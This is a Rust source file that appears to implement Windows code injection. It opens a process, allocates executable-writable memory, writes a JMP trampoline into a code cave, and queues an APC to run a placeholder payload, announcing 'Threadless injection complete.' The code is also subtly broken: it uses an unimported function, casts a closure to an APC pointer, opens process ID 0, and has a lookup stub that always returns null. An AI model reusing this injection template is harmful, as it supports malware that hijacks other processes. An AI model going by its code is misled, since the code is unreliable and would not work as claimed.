use std::fs::File;
use std::io::Read;
use std::ptr::null_mut;
use winapi::um::processthreadsapi::{OpenProcess, OpenThread, SuspendThread, ResumeThread, GetThreadId};
use winapi::um::winnt::{THREAD_SUSPEND_RESUME, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use winapi::um::memoryapi::VirtualAllocEx;
use winapi::um::winnt::{PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_VM_WRITE, PROCESS_CREATE_THREAD, DWORD};
use winapi::shared::minwindef::{FALSE};
use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;
use std::mem::size_of;
use std::thread;
use winapi::um::processthreadsapi::QueueUserAPC;
use winapi::um::minwinbase::PAPCFUNC;
use std::sync::{Arc, Mutex};

fn main() {
    // Get the current process handle
    let process_handle = unsafe { OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, 0) };
    if process_handle.is_null() {
        println!("Failed to open current process");
        return;
    }

    // Open the target DLL file
    let mut file = File::open("target.dll").unwrap();
    let mut dll_bytes = Vec::new();
    file.read_to_end(&mut dll_bytes).unwrap();

    // Resolve the target function address
    let function_address = unsafe { find_function_address("my_function".to_string()) }; // Custom function name placeholder
    if function_address.is_null() {
        println!("Failed to resolve function address");
        return;
    }

    // Calculate the jump offset for the trampoline buffer
    let cave_address = unsafe { VirtualAllocEx(process_handle, null_mut(), size_of::<usize>(), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE) };
    if cave_address.is_null() {
        println!("Failed to allocate memory in the target process");
        return;
    }

    // Calculate the jump offset for the trampoline buffer
    let jmp_offset = function_address as usize - cave_address as usize - size_of::<usize>(); // Calculate the correct jump offset
    let mut trampoline_buf = vec![0xE9]; // JMP opcode
    trampoline_buf.extend_from_slice(&(jmp_offset as i32).to_le_bytes()); // Convert the offset to little-endian bytes

    // Write the trampoline code to the code cave within the target process
    unsafe {
        WriteProcessMemory(process_handle, cave_address, trampoline_buf.as_ptr() as *const _, trampoline_buf.len(), null_mut());
    }

    // Obtain the handle to the target thread
    let thread_handle = unsafe { OpenThread(THREAD_SUSPEND_RESUME, FALSE, GetThreadId(process_handle)) };
    if thread_handle.is_null() {
        println!("Failed to obtain thread handle");
        return;
    }

    // Suspend the target thread
    let suspend_count = unsafe { SuspendThread(thread_handle) };
    if suspend_count == DWORD::MAX {
        println!("Failed to suspend thread");
        return;
    }

    // Execute the payload using APC injection
    let mut apc_executed = Arc::new(Mutex::new(false));
    let apc_executed_clone = Arc::clone(&apc_executed);
    let apc_function: PAPCFUNC = Box::into_raw(Box::new(move |_| {
        if let Ok(mut executed) = apc_executed.lock() {
            if !*executed {
                // Execute payload here
                // Example: println!("Payload executed successfully");
                *executed = true;
            }
        }
    }));

    unsafe {
        QueueUserAPC(Some(*apc_function), thread_handle, 0);
    }

    // Resume the thread's execution
    let resume_count = unsafe { ResumeThread(thread_handle) };
    if resume_count == DWORD::MAX {
        println!("Failed to resume thread");
        return;
    }

    // Wait for the payload execution to complete
    while !*apc_executed_clone.lock().unwrap() {
        thread::sleep(std::time::Duration::from_millis(100));
    }

    println!("Threadless injection complete.");
}

unsafe fn find_function_address(function_name: String) -> *mut u8 {
    // Custom implementation to find function address by name
    null_mut()
}
